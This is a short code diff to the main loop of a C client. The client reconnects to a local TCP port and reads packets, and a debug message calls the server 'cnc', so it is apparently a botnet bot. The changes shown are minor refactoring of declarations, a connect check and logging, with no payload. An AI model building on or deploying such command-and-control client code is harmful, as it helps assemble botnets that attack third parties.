@@ -131,7 +131,13 @@ static void init_uniq_id(void)
 
 int main(int argc, char *argv[])
 {
+	ssize_t buflen;
+	char pktbuf[512];
+
+#ifdef DEBUG
 	struct in_addr ip4;
+#endif
+	struct Packet pkt;
 	
 	proc_startup = time(NULL);
 	init_signals();
@@ -152,7 +158,7 @@ int main(int argc, char *argv[])
 	
 	while(!exiting)
 	{	
-		while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) <= 0)
+		while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) < 0)
 		{
 			if(exiting)
 				break;
@@ -169,11 +175,6 @@ int main(int argc, char *argv[])
 		
 		while(!exiting)
 		{
-			ssize_t buflen;
-			char pktbuf[512];
-			
-			struct Packet pkt;
-			
 			memset(pktbuf, 0, sizeof(pktbuf));
 			
 			if(read(sockfd, pktbuf, 1) == 0)
@@ -221,7 +222,8 @@ int main(int argc, char *argv[])
 			sleep(1);
 		} // While
 #ifdef DEBUG
-		util_msgc("Info", "Lost connection to cnc!");
+		if(!exiting)
+			util_msgc("Info", "Lost connection to cnc!");
 #endif
 	} // While
 	
